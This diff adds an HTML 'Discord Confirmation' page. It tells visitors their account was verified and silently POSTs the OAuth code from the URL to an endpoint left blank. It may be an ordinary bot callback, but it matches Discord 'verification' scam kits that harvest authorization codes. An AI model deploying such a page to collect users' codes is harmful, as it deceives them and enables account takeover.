@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Confirmation</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link href="" rel="icon" sizes="16x16" type="image/png">
+    <meta content="website" property="og:type">
+    <link href="https://use.typekit.net/joc7wli.css" rel="stylesheet">
+    <link href="https://fonts.cdnfonts.com/css/satoshi" rel="stylesheet">
+    <style>
+     @import url('https://fonts.cdnfonts.com/css/satoshi');
+                
+        body {
+            background-color: #000000;
+            background-image: url('');
+            background-size: 20%;
+            background-repeat: no-repeat;
+            background-position: bottom 0 right 7px;
+            color: #eaeaea;
+            font-family: 'Arial', sans-serif; /* Added a generic font-family */
+            padding: 20px; /* Added padding to body */
+            font-family: 'Satoshi', sans-serif !important; 
+        }
+        #box {
+            max-width: 400px; /* Changed width to max-width for responsiveness */
+            margin: 0 auto; /* Centered horizontally */
+            border: 2px solid #181a1f;
+            border-radius: 5px;
+            text-align: center;
+            padding: 40px;
+            border: 1px solid #1b1b22!important;
+            border-radius: 12px;
+            background-color: #020202;
+            margin-top: 264px;
+        }
+        #server_pic {
+            display: block;
+            margin: 10px auto;
+            max-width: 100%; /* Ensures image doesn't overflow its container */
+            border-radius: 1%;
+        }
+        hr {
+            margin: 20px auto; /* Centered horizontally */
+            background-color: #eaeaea;
+            max-width: 80%; /* Adjusted width for responsiveness */
+        }
+        .btn {
+            color: #fff;
+            padding: 10px 22px;
+            background-color: #000000;
+            margin-top: 20px; /* Added some spacing */
+            border: 1px solid #6a436082;
+            text-decoration: none;
+            background: linear-gradient(90deg,#6a43604f,#8833c01a);
+        }
+    </style>
+</head>
+<body>
+    <div id="box">
+        <h2>Verification</h2>
+        <p>Your Discord account has been successfully verified. You can close this page.</p>
+        <hr>
+        <button class="btn" onclick="closePage()">Close</button>
+    </div>
+
+    <script>
+        function closePage() {
+            window.close();
+        }
+
+        window.onload = function() {
+            const code = location.href.substring(location.href.indexOf("code") + 5);
+            if (location.href.indexOf("code") > -1) {
+                const req = new XMLHttpRequest();
+                req.open("POST", ""); // mettre le lien de redirection
+                req.send(code);
+                req.onload = function() {};
+            }
+        };
+    </script>
+</body>
+</html>
